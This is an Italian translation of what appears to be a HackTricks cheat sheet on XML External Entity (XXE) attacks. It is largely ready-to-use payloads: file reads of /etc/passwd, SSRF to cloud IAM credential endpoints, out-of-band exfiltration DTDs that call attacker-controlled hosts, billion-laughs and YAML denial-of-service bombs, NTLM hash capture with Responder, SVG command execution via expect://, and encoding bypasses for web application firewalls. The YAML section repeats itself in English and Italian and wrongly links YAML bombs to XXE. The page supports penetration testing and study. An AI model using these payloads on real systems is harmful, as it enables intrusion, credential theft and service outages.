# XXE - XEE - Entit√† Esterna XML

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


## Concetti di base di XML

XML √® un linguaggio di markup progettato per l'archiviazione e il trasporto dei dati, caratterizzato da una struttura flessibile che consente l'uso di tag con nomi descrittivi. Si differenzia dall'HTML per non essere limitato a un insieme di tag predefiniti. Nonostante il suo ruolo iniziale nella tecnologia AJAX, l'importanza di XML √® diminuita con l'avvento di JSON.

- **Rappresentazione dei dati tramite entit√†**: Le entit√† in XML consentono la rappresentazione dei dati, inclusi caratteri speciali come `&lt;` e `&gt;`, che corrispondono a `<` e `>` per evitare conflitti con il sistema di tag di XML.

- **Definizione degli elementi XML**: XML consente la definizione dei tipi di elementi, delineando come gli elementi dovrebbero essere strutturati e quale contenuto possono contenere, che pu√≤ variare da qualsiasi tipo di contenuto a elementi figlio specifici.

- **Definizione del tipo di documento (DTD)**: Le DTD sono cruciali in XML per definire la struttura del documento e i tipi di dati che pu√≤ contenere. Possono essere interne, esterne o una combinazione di entrambe, guidando la formattazione e la convalida dei documenti.

- **Entit√† personalizzate ed esterne**: XML supporta la creazione di entit√† personalizzate all'interno di una DTD per una rappresentazione flessibile dei dati. Le entit√† esterne, definite con un URL, sollevano preoccupazioni sulla sicurezza, in particolare nel contesto degli attacchi di Entit√† Esterna XML (XXE), che sfruttano il modo in cui i parser XML gestiscono le origini dei dati esterni: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`

- **Rilevamento di XXE con entit√† di parametro**: Per rilevare vulnerabilit√† XXE, specialmente quando i metodi convenzionali falliscono a causa delle misure di sicurezza del parser, possono essere utilizzate le entit√† di parametro XML. Queste entit√† consentono l'utilizzo di tecniche di rilevamento out-of-band, come l'attivazione di ricerche DNS o richieste HTTP a un dominio controllato, per confermare la presenza della vulnerabilit√†.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`


## Principali attacchi

**[La maggior parte di questi attacchi √® stata testata utilizzando i fantastici laboratori XEE di Portswiggers: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Nuovo test di entit√†

In questo attacco tester√≤ se una semplice dichiarazione di una nuova ENTIT√Ä funziona
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### Leggi il file

Proviamo a leggere `/etc/passwd` in modi diversi. Per Windows puoi provare a leggere: `C:\windows\system32\drivers\etc\hosts`

In questo primo caso, nota che SYSTEM "_\*\*file:///\*\*etc/passwd_" funzioner√† anche.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

Questo secondo caso potrebbe essere utile per estrarre un file se il server web sta utilizzando PHP (Non √® il caso dei laboratori di Portswiggers)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
In questo terzo caso notiamo che stiamo dichiarando l'`Element stockCheck` come ANY.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Elenco delle directory

Nelle applicazioni basate su **Java** potrebbe essere possibile **elencare i contenuti di una directory** tramite XXE con un payload come (chiedendo solo la directory anzich√© il file):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Un XXE potrebbe essere utilizzato per sfruttare un SSRF all'interno di un cloud
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

Utilizzando la **tecnica precedentemente commentata** puoi fare in modo che il server acceda a un server da te controllato per mostrarne la vulnerabilit√†. Ma se ci√≤ non funziona, potrebbe essere perch√© **le entit√† XML non sono consentite**, in tal caso potresti provare a utilizzare **le entit√† di parametro XML**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### SSRF "cieco" - Esfiltrare dati fuori banda

**In questa occasione faremo in modo che il server carichi una nuova DTD con un payload dannoso che invier√† il contenuto di un file tramite una richiesta HTTP (per file su pi√π righe potresti provare a esfiltrarlo tramite** _**ftp://**_**). Questa spiegazione si basa sul** [**laboratorio di Portswiggers qui**](https://portswigger.net/web-security/xxe/blind)**.**

Nella DTD dannosa fornita, vengono eseguiti una serie di passaggi per esfiltrare i dati:

### Esempio di DTD dannosa:
La struttura √® la seguente:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
I passaggi eseguiti da questa DTD includono:

1. **Definizione delle Entit√† di Parametro:**
- Viene creato un parametro di entit√† XML, `%file`, che legge il contenuto del file `/etc/hostname`.
- Un'altra entit√† di parametro XML, `%eval`, viene definita. Essa dichiara dinamicamente una nuova entit√† di parametro XML, `%exfiltrate`. L'entit√† `%exfiltrate` viene impostata per effettuare una richiesta HTTP al server dell'attaccante, passando il contenuto dell'entit√† `%file` all'interno della stringa di query dell'URL.

2. **Esecuzione delle Entit√†:**
- Viene utilizzata l'entit√† `%eval`, portando all'esecuzione della dichiarazione dinamica dell'entit√† `%exfiltrate`.
- Successivamente, viene utilizzata l'entit√† `%exfiltrate`, scatenando una richiesta HTTP all'URL specificato con il contenuto del file.

L'attaccante ospita questa DTD dannosa su un server sotto il suo controllo, tipicamente all'URL `http://web-attacker.com/malicious.dtd`.

**Payload XXE:**
Per sfruttare un'applicazione vulnerabile, l'attaccante invia un payload XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Questo payload definisce un'entit√† di parametro XML `%xxe` e la incorpora all'interno del DTD. Quando viene elaborato da un parser XML, questo payload recupera il DTD esterno dal server dell'attaccante. Il parser interpreta quindi il DTD in linea, eseguendo i passaggi descritti nel DTD dannoso e portando all'esfiltrazione del file `/etc/hostname` verso il server dell'attaccante.


### Basato su errori (DTD esterno)

**In questo caso faremo in modo che il server carichi un DTD dannoso che mostrer√† il contenuto di un file all'interno di un messaggio di errore (questo √® valido solo se √® possibile visualizzare i messaggi di errore).** [**Esempio da qui.**](https://portswigger.net/web-security/xxe/blind)

√à possibile innescare un messaggio di errore di analisi XML, che rivela il contenuto del file `/etc/passwd`, utilizzando una definizione di tipo di documento (DTD) esterno dannoso. Ci√≤ viene realizzato attraverso i seguenti passaggi:

1. Viene definita un'entit√† di parametro XML chiamata `file`, che contiene il contenuto del file `/etc/passwd`.
2. Viene definita un'entit√† di parametro XML chiamata `eval`, che incorpora una dichiarazione dinamica per un'altra entit√† di parametro XML chiamata `error`. Questa entit√† `error`, quando valutata, tenta di caricare un file inesistente, incorporando il contenuto dell'entit√† `file` come nome del file.
3. Viene invocata l'entit√† `eval`, portando alla dichiarazione dinamica dell'entit√† `error`.
4. L'invocazione dell'entit√† `error` comporta un tentativo di caricare un file inesistente, producendo un messaggio di errore che include il contenuto del file `/etc/passwd` come parte del nome del file.

Il DTD esterno dannoso pu√≤ essere invocato con il seguente XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
All'esecuzione, la risposta del server web dovrebbe includere un messaggio di errore che mostra il contenuto del file `/etc/passwd`.


![](<../.gitbook/assets/image (223) (1).png>)

_**Si prega di notare che il DTD esterno ci consente di includere un'entit√† all'interno della seconda (****`eval`****), ma √® vietato nel DTD interno. Pertanto, non √® possibile forzare un errore senza utilizzare un DTD esterno (di solito).**_

### **Basato sull'errore (DTD di sistema)**

E per quanto riguarda le vulnerabilit√† XXE cieche quando le **interazioni fuori banda sono bloccate** (le connessioni esterne non sono disponibili)?.

Una falla nella specifica del linguaggio XML pu√≤ **esporre dati sensibili attraverso messaggi di errore quando il DTD di un documento mescola dichiarazioni interne ed esterne**. Questo problema consente la ridefinizione interna di entit√† dichiarate esternamente, facilitando l'esecuzione di attacchi XXE basati sull'errore. Tali attacchi sfruttano la ridefinizione di un'entit√† di parametro XML, originariamente dichiarata in un DTD esterno, all'interno di un DTD interno. Quando le connessioni fuori banda sono bloccate dal server, gli attaccanti devono fare affidamento su file DTD locali per condurre l'attacco, mirando a indurre un errore di parsing per rivelare informazioni sensibili.


Considera uno scenario in cui il filesystem del server contiene un file DTD in `/usr/local/app/schema.dtd`, che definisce un'entit√† chiamata `custom_entity`. Un attaccante pu√≤ indurre un errore di parsing XML che rivela il contenuto del file `/etc/passwd` inviando un DTD ibrido come segue:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
I passaggi delineati vengono eseguiti da questa DTD:

- La definizione di un'entit√† di parametro XML chiamata `local_dtd` include il file DTD esterno situato nel filesystem del server.
- Si verifica una ridefinizione dell'entit√† di parametro XML `custom_entity`, originariamente definita nel DTD esterno, per incapsulare un [exploit XXE basato su errori](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Questa ridefinizione √® progettata per provocare un errore di parsing, esponendo il contenuto del file `/etc/passwd`.
- Utilizzando l'entit√† `local_dtd`, viene coinvolto il DTD esterno, che comprende la nuova entit√† `custom_entity`. Questa sequenza di azioni provoca l'emissione del messaggio di errore mirato dall'exploit.


**Esempio del mondo reale:** I sistemi che utilizzano l'ambiente desktop GNOME spesso hanno un DTD in `/usr/share/yelp/dtd/docbookx.dtd` che contiene un'entit√† chiamata `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Poich√© questa tecnica utilizza un **DTD interno, √® necessario prima trovare uno valido**. Puoi farlo **installando** lo stesso **OS / Software** che il server sta utilizzando e **ricercando alcuni DTD predefiniti**, oppure **ottenendo una lista** di **DTD predefiniti** all'interno dei sistemi e **verificando** se ne esiste uno tra di loro:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Per ulteriori informazioni, consulta [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Trovare DTD all'interno del sistema

Nel seguente repository GitHub fantastico puoi trovare **percorsi di DTD che possono essere presenti nel sistema**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Inoltre, se hai l'**immagine Docker del sistema vittima**, puoi utilizzare lo strumento dello stesso repository per **scansionare** l'**immagine** e **trovare** il percorso dei **DTD** presenti all'interno del sistema. Leggi il [Readme del repository GitHub](https://github.com/GoSecure/dtd-finder) per saperne di pi√π.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE tramite parser Office Open XML

Per una spiegazione pi√π approfondita di questo attacco, **controlla la seconda sezione di [questo incredibile post](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) di Detectify**.

Molte applicazioni web offrono la possibilit√† di **caricare documenti Microsoft Office**, che vengono poi elaborati per estrarre determinati dettagli da questi documenti. Ad esempio, un'applicazione web potrebbe consentire agli utenti di importare dati caricando un foglio di calcolo nel formato XLSX. Per estrarre i dati dal foglio di calcolo, il parser dovr√† inevitabilmente analizzare almeno un file XML.

Per testare questa vulnerabilit√†, √® necessario creare un **file Microsoft Office contenente un payload XXE**. Il primo passo √® creare una directory vuota in cui il documento pu√≤ essere decompresso.

Una volta che il documento √® stato decompresso, il file XML situato in `./unzipped/word/document.xml` deve essere aperto e modificato con un editor di testo preferito (come vim). L'XML deve essere modificato per includere il payload XXE desiderato, spesso iniziando con una richiesta HTTP.

Le linee XML modificate devono essere inserite tra i due oggetti XML principali. √à importante sostituire l'URL con un URL monitorabile per le richieste.

Infine, il file pu√≤ essere compresso per creare il file malizioso poc.docx. Dalla directory "unzipped" creata in precedenza, eseguire il seguente comando:

Ora, il file creato pu√≤ essere caricato nell'applicazione web potenzialmente vulnerabile, e si pu√≤ sperare che una richiesta appaia nei log di Burp Collaborator.


### Protocollo Jar

Il protocollo **jar** √® accessibile esclusivamente all'interno delle **applicazioni Java**. √à progettato per consentire l'accesso ai file all'interno di un archivio **PKZIP** (ad esempio, `.zip`, `.jar`, ecc.), sia per file locali che remoti.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Per poter accedere ai file all'interno dei file PKZIP √® **molto utile per sfruttare XXE tramite file DTD di sistema**. Controlla [questa sezione per imparare come sfruttare i file DTD di sistema](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Il processo di accesso a un file all'interno di un archivio PKZIP tramite il protocollo jar prevede diversi passaggi:

1. Viene effettuata una richiesta HTTP per scaricare l'archivio zip da una posizione specificata, come ad esempio `https://download.website.com/archive.zip`.
2. La risposta HTTP contenente l'archivio viene temporaneamente memorizzata nel sistema, di solito in una posizione come `/tmp/...`.
3. L'archivio viene quindi estratto per accedere ai suoi contenuti.
4. Viene letto il file specifico all'interno dell'archivio, `file.zip`.
5. Dopo l'operazione, tutti i file temporanei creati durante questo processo vengono eliminati.

Una tecnica interessante per interrompere questo processo al secondo passaggio prevede di mantenere aperta la connessione del server indefinitamente durante il servizio del file di archivio. Gli strumenti disponibili in [questo repository](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) possono essere utilizzati a tale scopo, tra cui un server Python (`slow_http_server.py`) e un server Java (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Scrivere file in una directory temporanea pu√≤ aiutare ad **escalare un'altra vulnerabilit√† che coinvolge una traversa del percorso** (come l'inclusione di file locali, l'iniezione di template, RCE XSLT, deserializzazione, ecc.).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Attacco Billion Laugh

L'attacco Billion Laugh √® una forma di attacco Denial of Service (DoS) che sfrutta una vulnerabilit√† nelle applicazioni che analizzano documenti XML. Questo attacco sfrutta la funzionalit√† di espansione delle entit√† esterne (XXE) per creare un loop infinito di entit√† XML, sovraccaricando il sistema target e causando un'interruzione del servizio.

L'attacco prende il nome dal fatto che utilizza una struttura a cascata di entit√† XML, in cui ogni entit√† si riferisce a un'altra entit√†, creando un effetto a catena che si espande esponenzialmente. Questo pu√≤ causare un consumo eccessivo di risorse del sistema, come la CPU e la memoria, portando alla saturazione del sistema e alla sua incapacit√† di rispondere alle richieste legittime degli utenti.

Per proteggersi da questo tipo di attacco, √® consigliabile implementare controlli di sicurezza adeguati, come la validazione e la sanitizzazione dei dati di input, nonch√© l'utilizzo di parser XML sicuri che disabilitano l'espansione delle entit√† esterne. Inoltre, √® importante tenere aggiornati i software e le librerie utilizzate per analizzare i documenti XML, in modo da beneficiare delle patch di sicurezza pi√π recenti.
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Attacco Yaml

The YAML attack is a technique used to exploit vulnerabilities in applications that parse YAML files. YAML (YAML Ain't Markup Language) is a human-readable data serialization format commonly used for configuration files.

L'attacco YAML √® una tecnica utilizzata per sfruttare le vulnerabilit√† nelle applicazioni che analizzano i file YAML. YAML (YAML Ain't Markup Language) √® un formato di serializzazione dei dati leggibile dall'uomo comunemente utilizzato per i file di configurazione.

In a YAML attack, an attacker crafts a malicious YAML file containing specially crafted data that can be interpreted by the application in unintended ways. This can lead to various security issues, such as remote code execution, denial of service, or information disclosure.

In un attacco YAML, un attaccante crea un file YAML malevolo contenente dati appositamente creati che possono essere interpretati dall'applicazione in modi non intenzionali. Ci√≤ pu√≤ portare a vari problemi di sicurezza, come l'esecuzione remota di codice, il rifiuto del servizio o la divulgazione di informazioni.

One common vulnerability that can be exploited through a YAML attack is the XML External Entity (XXE) vulnerability. This vulnerability occurs when an application parses XML data without properly validating or sanitizing it, allowing an attacker to include external entities or access sensitive files on the server.

Una vulnerabilit√† comune che pu√≤ essere sfruttata attraverso un attacco YAML √® la vulnerabilit√† delle Entit√† Esterne XML (XXE). Questa vulnerabilit√† si verifica quando un'applicazione analizza dati XML senza una corretta convalida o sanificazione, consentendo a un attaccante di includere entit√† esterne o accedere a file sensibili sul server.

To protect against YAML attacks, it is important to implement proper input validation and sanitization techniques. Applications should also avoid parsing user-supplied YAML files or should use secure parsers that do not evaluate external entities.

Per proteggersi dagli attacchi YAML, √® importante implementare tecniche adeguate di convalida e sanificazione degli input. Le applicazioni dovrebbero anche evitare di analizzare file YAML forniti dall'utente o dovrebbero utilizzare parser sicuri che non valutano entit√† esterne.

Overall, understanding and mitigating YAML attacks is crucial for ensuring the security of applications that parse YAML files. By following secure coding practices and regularly updating software dependencies, developers can reduce the risk of exploitation.
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Attacco di esplosione quadratica

![](<../.gitbook/assets/image (531).png>)

#### Ottenere NTML

Su host Windows √® possibile ottenere l'hash NTML dell'utente del server web impostando un gestore responder.py:
```bash
Responder.py -I eth0 -v
```
e inviando la seguente richiesta
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Quindi puoi provare a craccare l'hash utilizzando hashcat

## Superfici XXE nascoste

### XInclude

Quando si integra dei dati client in documenti XML lato server, come quelli nelle richieste SOAP di backend, il controllo diretto sulla struttura XML √® spesso limitato, ostacolando gli attacchi XXE tradizionali a causa delle restrizioni sulla modifica dell'elemento `DOCTYPE`. Tuttavia, un attacco `XInclude` fornisce una soluzione consentendo l'inserimento di entit√† esterne all'interno di qualsiasi elemento dati del documento XML. Questo metodo √® efficace anche quando √® possibile controllare solo una parte dei dati all'interno di un documento XML generato dal server.

Per eseguire un attacco `XInclude`, √® necessario dichiarare il namespace `XInclude` e specificare il percorso del file per l'entit√† esterna desiderata. Di seguito √® riportato un esempio sintetico di come pu√≤ essere formulato un tale attacco:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Controlla [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) per ulteriori informazioni!

### SVG - Caricamento di file

I file caricati dagli utenti su determinate applicazioni, che vengono quindi elaborati sul server, possono sfruttare vulnerabilit√† nella gestione di file XML o file contenenti XML. I formati di file comuni come i documenti di Office (DOCX) e le immagini (SVG) si basano su XML.

Quando gli utenti **caricano immagini**, queste immagini vengono elaborate o convalidate lato server. Anche per le applicazioni che si aspettano formati come PNG o JPEG, **la libreria di elaborazione delle immagini del server potrebbe supportare anche immagini SVG**. SVG, essendo un formato basato su XML, pu√≤ essere sfruttato dagli attaccanti per inviare immagini SVG dannose, esponendo cos√¨ il server a vulnerabilit√† di XXE (XML External Entity).

Di seguito viene mostrato un esempio di tale exploit, in cui un'immagine SVG dannosa tenta di leggere file di sistema:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Un altro metodo consiste nel tentare di **eseguire comandi** tramite l'incapsulamento PHP "expect":
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
In entrambi i casi, il formato SVG viene utilizzato per lanciare attacchi che sfruttano le capacit√† di elaborazione XML del software del server, evidenziando la necessit√† di una robusta convalida degli input e misure di sicurezza.

Controlla [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) per ulteriori informazioni!

**Nota che la prima riga del file letto o del risultato dell'esecuzione apparir√† ALL'INTERNO dell'immagine creata. Quindi √® necessario essere in grado di accedere all'immagine creata da SVG.**

### **PDF - Caricamento file**

Leggi il seguente post per **imparare come sfruttare un XXE caricando un file PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Da x-www-urlencoded a XML

Se una richiesta POST accetta i dati in formato XML, potresti provare a sfruttare un XXE in quella richiesta. Ad esempio, se una richiesta normale contiene quanto segue:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Allora potresti provare a inviare la seguente richiesta, ottenendo lo stesso risultato:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Da JSON a XEE

Per modificare la richiesta, √® possibile utilizzare un'estensione di Burp chiamata "**Content Type Converter**". [Qui](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) puoi trovare questo esempio:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Un altro esempio pu√≤ essere trovato [qui](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Bypass di WAF e Protezioni

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Questo funziona solo se il server XML accetta il protocollo `data://`.

### UTF-7

Puoi utilizzare la \[**"Ricetta di codifica**" di cyberchef qui ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) trasformare in UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Bypass del protocollo File:/

Se il sito web utilizza PHP, invece di utilizzare `file:/` puoi utilizzare i **wrapper php** `php://filter/convert.base64-encode/resource=` per **accedere ai file interni**.

Se il sito web utilizza Java, puoi verificare il [**protocollo jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### Entit√† HTML

Trucco da [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Puoi creare una **entit√† all'interno di un'altra entit√†** codificandola con **entit√† HTML** e quindi richiamarla per **caricare un dtd**.\
